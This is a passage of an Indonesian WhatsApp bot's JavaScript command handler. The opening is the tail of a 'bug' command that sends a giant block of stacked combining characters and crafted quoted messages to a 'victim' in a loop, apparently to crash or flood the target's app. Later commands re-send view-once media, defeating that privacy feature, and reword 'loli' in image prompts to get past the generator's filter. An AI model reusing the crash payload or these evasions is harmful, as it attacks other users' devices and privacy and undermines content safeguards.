̨̢̢̢̡̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅ`
      commet: xiphone,
      jpegThumbnail: null
    }
  }, { quoted: xbug })
  await xartva.relayMessage(victim, {
    extendedTextMessage: {
      text: xiphone,
      contextInfo: {
        stanzaId: victim,
        participants: victim,
        quotedMessage: {
          conversation: xtext        
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      },
      inviteLinkGroupTypeV2: true
    }
  }, { messageId: null })
  await xartva.relayMessage(victim, {
    extendedTextMessage: {
      text: xiphone,
      contextInfo: {
        stanzaId: victim,
        participants: victim,
        quotedMessage: {
          conversation: xtext        
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      },
      inviteLinkGroupTypeV2: true
    }
  }, { messageId: null })
  await sleep(8000)
}
await xreply(`> Done! Sending BUG Use ${prefix + command}`)
}
break
//=================================================//
case "stickermenu":{
await loading()
const smenu = `
┏━━━━━━━━━━━━━━━━━
┃ Xartva BOT INFO
┏━━━━━━━━━━━━━━━━━
┃ ♙ *Bot Name :* ${botname}
┃ ☏ *Creator :* OzzyDev
┃ Ⓡ *Runtime :* ${runtime(process.uptime())}
┃ ♗ *Version :* 999999
┗━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━
┃ Xartva USER INFO
┏━━━━━━━━━━━━━━━━━
┃ ♙ *Name :* ${pushname}
┃ ☏ *Number :* ${m?.sender.split('@')[0]}
┃ ♗ *Status* : ${isCreator ? "Owner" : "User"}
┗━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━
┃ Xartva STICKER Menu
┏━━━━━━━━━━━━━━━━━
┃ ❒ .s
┃ ❒ .stickers
┃ ❒ .smeme
┃ ❒ .swm
┃ ❒ .qc
┗━━━━━━━━━━━━━━━━━
`
xartva.sendMessage(m?.chat, {
  image: {
    url: "https://l.top4top.io/p_3265i2jbk9.jpg"
  },
  caption: smenu
}, { quoted: m })
}
break
//=================================================//
case "toolsmenu":{
await loading()
const tmenu = `
┏━━━━━━━━━━━━━━━━━
┃ Xartva BOT INFO
┏━━━━━━━━━━━━━━━━━
┃ ♙ *Bot Name :* ${botname}
┃ ☏ *Creator :* OzzyDev
┃ Ⓡ *Runtime :* ${runtime(process.uptime())}
┃ ♗ *Version :* 999999
┗━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━
┃ Xartva USER INFO
┏━━━━━━━━━━━━━━━━━
┃ ♙ *Name :* ${pushname}
┃ ☏ *Number :* ${m?.sender.split('@')[0]}
┃ ♗ *Status* : ${isCreator ? "Owner" : "User"}
┗━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━
┃ Xartva TOOLS Menu
┏━━━━━━━━━━━━━━━━━
┃ ❒ .out
┃ ❒ .tempban
┃ ❒ .kalkulator
┃ ❒ .jarak
┃ ❒ .ssweb
┃ ❒ .get
┗━━━━━━━━━━━━━━━━━
`
xartva.sendMessage(m?.chat, {
  image: {
    url: "https://l.top4top.io/p_3265i2jbk9.jpg"
  },
  caption: tmenu
}, { quoted: m })
}
break
//=================================================//
case "groupmenu":{
await loading()
const gcmenu = `
┏━━━━━━━━━━━━━━━━━
┃ Xartva BOT INFO
┏━━━━━━━━━━━━━━━━━
┃ ♙ *Bot Name :* ${botname}
┃ ☏ *Creator :* OzzyDev
┃ Ⓡ *Runtime :* ${runtime(process.uptime())}
┃ ♗ *Version :* 999999
┗━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━
┃ Xartva USER INFO
┏━━━━━━━━━━━━━━━━━
┃ ♙ *Name :* ${pushname}
┃ ☏ *Number :* ${m?.sender.split('@')[0]}
┃ ♗ *Status* : ${isCreator ? "Owner" : "User"}
┗━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━
┃ Xartva Group Menu
┏━━━━━━━━━━━━━━━━━
┃ ❒ .add
┃ ❒ .kick
┃ ❒ .promote
┃ ❒ .demote
┗━━━━━━━━━━━━━━━━━
`
xartva.sendMessage(m?.chat, {
  image: {
    url: "https://l.top4top.io/p_3265i2jbk9.jpg"
  },
  caption: gcmenu
}, { quoted: m })
}
break
//=================================================//
case "ai":{
if (!text) return xreply("mau nanya apa sama naw")
let { data } = await axios.get("https://www.putz.my.id/api/ai?type=hercai&q=" + text)
xreply(data.result)
}
break
//=================================================//
case "gemini-img":{
if (!quoted) return xreply(`Balas Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return xreply("hanya support gambar")
let media = await xartva.downloadAndSaveMediaMessage(qmsg)
let urlgambar = await TelegraPH(media)
let { data } = await axios.get("https://gmni.vercel.app/api/img?imageUrl="+ urlgambar +"&prompt=" + text)
xreply(data.text)
}
break
//=================================================//
case "gemini":
if (!text) return xreply("mau nanya apa sama naw")
let { data } = await axios.get("https://gmni.vercel.app/api/ask?text=" + text)
xreply(data.text)
}
break
//=================================================//
case "ocr":{
let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''
if (!mime) return m.reply(`balas gambar dengan perintah .ocr`)
if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`_*jenis ${mime} tidak didukung!*_`)
const ocrapi = require("ocr-space-api-wrapper")
let img = await xartva.downloadAndSaveMediaMessage(q)
let url = await TelegraPH(img)
let hasil = await ocrapi.ocrSpace(url)
 await m.reply(hasil.ParsedResults[0].ParsedText)
}
break
//=================================================//

//=================================================//
case "stickers":{
if (!text) return m.reply(`Ex : ${prefix + command} kucing`);
const anu = await stickersearch(text);
const shuffledStickers = anu.sticker.sort(() => Math.random() - 0.5);
const randomStickers = shuffledStickers.slice(0, 10);

if (randomStickers.length > 0) {
for (let i = 0; i < randomStickers.length; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
await xartva.sendImageAsSticker(m?.chat, randomStickers[i], m, {
packname: global.packname,
author: global.author
});
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await xreply(`Failed to send sticker *(${i + 1}/${randomStickers.length})*`);
}
}
}}
break
//=================================================//
case "tr":{
let lang, text
if (args.length >= 2) {
lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
} else if (m?.quoted && m?.quoted.text) {
lang = args[0] ? args[0] : 'id', text = m?.quoted.text
} else throw `Ex: ${usedPrefix + command} id hello i am robot`
const translate = require('@vitalets/google-translate-api')
let res = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null)
if (!res) return xreply(`Error : Bahasa"${lang}" Tidak Support`)
xreply(`*Terdeteksi Bahasa:* ${res.from?.language.iso}\n*Ke Bahasa:* ${lang}\n\n*Terjemahan:* ${res.text}`.trim())
}
break
//=================================================//
case 'ss': case 'ssweb':{
if (!/^https?:\/\//.test(text)) return xreply('Awali *URL* dengan http:// atau https://')
let krt = await ssweb(text)
xartva.sendMessage(m.chat,{image: krt.result, caption: "Done"},{quoted:m})
}
break
//=================================================//
case "kalkulator":{
 val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
xreply(`*${format}* = _${result}_`)
} catch (e) {
if (e == undefined) return xreply('Isinya?')
xreply('Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
}
break
//=================================================//
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':{
if (!qmsg) return m.reply("reply audio nya")
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await xartva.downloadAndSaveMediaMessage(qmsg)
let ran = pickRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply(err)
let buff = fs.readFileSync(ran)
xartva.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else m.reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
} catch (e) {
console.log(e)
m.reply('error')
}}
break
//=================================================//
case "jarak":{
var [from, to] = text.split`|`
if (!(from && to)) return m.reply(`Ex: ${prefix + command} jakarta|bandung`)
var data = await jarak(from, to)
if (data.img) return xartva.sendMessage(m?.chat, { image: data.img, caption: data.desc }, { quoted: m })
else xreply(data.desc)
}
break
//=================================================//
case 'cls': {
if (!m?.quoted) return xreply('Reply with a sticker!')
let stiker = false
try {
let [packname, ...author] = text.split('|')
author = (author || []).join('|')
let mime = m?.quoted.mimetype || ''
if (!/webp/.test(mime)) throw 'Reply with a sticker!'
let img = await m?.quoted.download()
if (!img) throw 'Failed to download sticker!'
stiker = await addExif(img, packname || global.packname, author || global.author )
} catch (e) {
console.error(e)
if (Buffer.isBuffer(e)) stiker = e
else throw 'An error occurred: ' + e
} finally {
if (stiker) xartva.sendFile(m?.chat, stiker, 'wms.webp', '', m, false, { asSticker: true })
else throw 'Conversion failed'
}
}
break 
//=================================================//
case 'tts':{
if (!text) return xreply(`[ ! ] ${prefix}${command} halo world`)
 const a = await (await axios.post("https://gesserit.co/api/tiktok-tts", { text: text, voice: "id_001" }, { headers: { Referer: "https://gesserit.co/tiktok", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" ,responseType: "arraybuffer"}})).data
const b = Buffer.from(a.audioUrl)
xartva.sendMessage(m?.chat, { audio: Buffer.from(a.audioUrl.split("base64,")[1],"base64"), mimetype: "audio/mpeg" })
}
break
//=================================================//
case 'remini':{
if (!quoted) return xreply(`Balas Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return xreply("hanya support gambar")
let media = await quoted.download()
const This = await remini(media, "enhance");
xartva.sendFile(m?.chat, This, "", "Done", m);
}
break
//=================================================//
case 'recolor':{
if(!quoted) return xreply(`Balas Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return xreply("gambar wae")
let media = await quoted.download()
const RC = await remini(media, "recolor");
xartva.sendFile(m?.chat, RC, "", "Done", m);
}
break
//=================================================//
case 'tiktok':
case 'tt': {
if (args.length == 0) return m.reply(`Example: ${prefix + command} link lu`)
let res = await tiktok(`${args[0]}`)
xartva.sendMessage(m.chat, { video: { url: res.nowm }, caption: res.title, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
xartva.sendMessage(m.chat, { audio: { url: res.audio }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
})
}
break
//=================================================//
case "get": {
if (!/^https?:\/\//.test(text)) return xreply('Awali *URL* dengan http:// atau https://')
let linknyaurl = await shorturl(text)
let _url = new URL(text)
let url = `${_url.origin}${_url.pathname}${_url.search}`;
let res = await fetch(url)
if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
delete res
throw `Content-Length: ${res.headers.get('content-length')}`
}
if (!/text|json/.test(res.headers.get('content-type'))) return xartva.sendFile(m?.chat, url, 'file', `*Link:* ${linknyaurl}\n\n2024 © PutuOfc`, m)
let txt = await res.buffer()
try {
txt = util.format(JSON.parse(txt + ''))
} catch (e) {
txt = txt + ''
} finally {
xreply(txt.slice(0, 65536) + '')
}
}
break
//=================================================//
case 'readvo': case 'readviewonce': {
if (!m?.quoted) return xreply('reply gambar/video yang ingin Anda lihat')
if (m?.quoted.mtype !== 'viewOnceMessageV2') return xreply('Ini bukan pesan view-once.')
let msg = m?.quoted.message
let type = Object.keys(msg)[0]
const { downloadContentFromMessage } = require('@adiwajshing/baileys')
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
return xartva.sendFile(m?.chat, buffer, 'media.mp4', msg[type].caption || '', m)
} else if (/image/.test(type)) {
return xartva.sendFile(m?.chat, buffer, 'media.jpg', msg[type].caption || '', m)
}
}
break
//=================================================//
case 'qc': {
const { quote } = require('./lib/quote.js')
let text
if (args.length >= 1) {
text = args.slice(0).join(" ")
} else if (m?.quoted && m?.quoted.text) {
text = m?.quoted.text
} else xreply("Input teks atau reply teks yang ingin di jadikan quote!")
if (!text) return xreply('masukan text')
if (text.length > 30) return xreply('Maksimal 30 Teks!')
let ppnyauser = await await xartva.profilePictureUrl(m?.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
const rest = await quote(text, pushname, ppnyauser)
xartva.sendImageAsSticker(m?.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
//=================================================//
case 'sticker':
case 'stiker':
case 's':{
if (!quoted) return xreply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await xartva.sendImageAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 21) return xreply('Maksimal 20 detik!')
let media = await quoted.download()
let encmedia = await xartva.sendVideoAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else {
return xreply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
//=================================================//
case 'smeme': {
let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
if (!/image/.test(mime)) return xreply(respond)
if (!text) return xreply(respond)
try {
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await xartva.downloadAndSaveMediaMessage(qmsg)
let fatGans = await TelegraPH(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
let FaTiH = await xartva.sendImageAsSticker(m?.chat, smeme, m, { packname: global.packname, author: global.auhor })
await fs.unlinkSync(FaTiH)
} catch (e) {
}
}
break
 //=================================================//
case 'swm': {
let [teks1, teks2] = text.split`|`
if (!teks1) return xreply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
if (!teks2) return xreply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
if (/image/.test(mime)) {
let media = await xartva.downloadMediaMessage(qmsg)
let encmedia = await xartva.sendImageAsSticker(m?.chat, media, m, { packname: teks1, author: teks2 })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return xreply('Maksimal 10 detik!')
let media = await xartva.downloadMediaMessage(qmsg)
let encmedia = await xartva.sendVideoAsSticker(m?.chat, media, m, { packname: teks1, author: teks2 })
await fs.unlinkSync(encmedia)
} else {
return xreply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
//=================================================//
case "bingimg-2d": {
if (!text) return xreply("[ ! ] masukan prompt gambar yang mau di bikin");
let teksu = text.replace(/loli/gi, "anak gadis kecil");
try {
const { BingApi, apikeybing } = require('./lib/bing-image.js');
const bingApi = new BingApi(apikeybing);
const imagesUrls = await bingApi.createImages(teksu + ". Anime Style ultra, HD Anime Style, 4K Anime Style, Anime Style, High quality, Ultra grapics, HD Cinematic, anime, 4K resolution, HD quality, Ultra CGI, High quality, Ultra grapics, HD Cinematic", false);
const totalCount = imagesUrls.length;
const credits = await bingApi.getCredits();

if (totalCount > 0) {
for (let i = 0; i < totalCount; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
xartva.sendMessage(m?.chat, { image: { url: imagesUrls[i] }, caption: `Image *(${i + 1}/${totalCount})*\n\nRemaining Credits: ${credits}\nPrompt: ${text}` }, { quoted: m });
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await xreply(`Failed to send image *(${i + 1}/${totalCount})*`);
}
}
} else {
await xreply('No images found after filtering.');
}
} catch (error) {
await xreply('An error occurred while processing the request.');
}
};
break
//=================================================//
case "ping":
case "botstatus":
case "statusbot": {
const used = process.memoryUsage();
const cpus = os.cpus().map((cpu) => {
cpu.total = Object.keys(cpu.times).reduce(
(last, type) => last + cpu.times[type],
0,
);
return cpu;
});
const cpu = cpus.reduce(
(last, cpu, _, { length }) => {
last.total += cpu.total;
last.speed += cpu.speed / length;
last.times.user += cpu.times.user;
last.times.nice += cpu.times.nice;
last.times.sys += cpu.times.sys;
last.times.idle += cpu.times.idle;
last.times.irq += cpu.times.irq;
return last;
},
{
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0,
},
},
);

var date = new Date();
var jam = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();
var ram = `${formatSize(process.memoryUsage().heapUsed)} / ${formatSize(os.totalmem)}`;
var cpuuuu = os.cpus();
var sisaram = `${Math.round(os.freemem)}`;
var totalram = `${Math.round(os.totalmem)}`;
var persenram = (sisaram / totalram) * 100;
var persenramm = 100 - persenram;
var ramused = totalram - sisaram;

var space = await checkDiskSpace(process.cwd());
var freespace = `${Math.round(space.free)}`;
var totalspace = `${Math.round(space.size)}`;
var diskused = totalspace - freespace;
var neww = performance.now();
var oldd = performance.now();
let timestamp = speed();
let latensi = speed() - timestamp;
var { download, upload } = await checkBandwidth();
let respon = ` *ᴘ ɪ ɴ ɢ* 
 ${Math.round(neww - oldd)} ms 
 ${latensi.toFixed(4)} ms 

 *ʀ ᴜ ɴ ᴛ ɪ ᴍ ᴇ*
 ${runtime(process.uptime())} 

 *s ᴇ ʀ ᴠ ᴇ ʀ* 
 *🛑 ʀᴀᴍ:* ${formatSize(ramused)} (${persenramm?.toString().split('.')[0]}%) / ${formatSize(totalram)} 
 *🔵 ғʀᴇᴇRAM:* ${formatSize(sisaram)} 
 *🔴 ᴍᴇᴍᴏʀy:* ${ram}
 *🗂 ᴅɪꜱᴋ:* ${formatSize(diskused)} / ${formatSize(totalspace)}
 *📂 ғʀᴇᴇDISK:* ${formatSize(freespace)}
 *🔭 ᴘʟᴀᴛғᴏʀᴍ:* ${os.platform()}
 *🧿 sᴇʀᴠᴇʀ:* ${os.hostname()}
 *📤 ᴜᴘʟᴏᴀᴅ:* ${upload}
 *📥 ᴅᴏᴡɴʟᴏᴀᴅ:* ${download}
 *⏰ ᴛɪᴍᴇ sᴇʀᴠᴇʀ:* ${jam} : ${menit} : ${detik}
 
 *📮 ɴᴏᴅᴇᴊꜱ ᴠᴇʀꜱɪᴏɴ:* ${process.version}
 *💻 ᴄᴘᴜ ᴍᴏᴅᴇʟ:* ${cpuuuu[0].model}
 *📊 ᴏꜱ ᴠᴇʀꜱɪᴏɴ:* ${os.version()}
 
_NodeJS Memory Usaage_
${Object.keys(used)
.map(
(key, _, arr) =>
`${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
used[key],
)}`,
)
.join("\n")}
${readmore}
${cpus[0]
? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times)
.map(
(type) =>
`- *${(type + "*").padEnd(6)}: ${(
(100 * cpu.times[type]) /
cpu.total
).toFixed(2)}%`,
)
.join("\n")}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus
.map(
(cpu, i) =>
`${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(
cpu.times,
)
.map(
(type) =>
`- *${(type + "*").padEnd(6)}: ${(
(100 * cpu.times[type]) /
cpu.total
).toFixed(2)}%`,
)
.join("\n")}`,
)
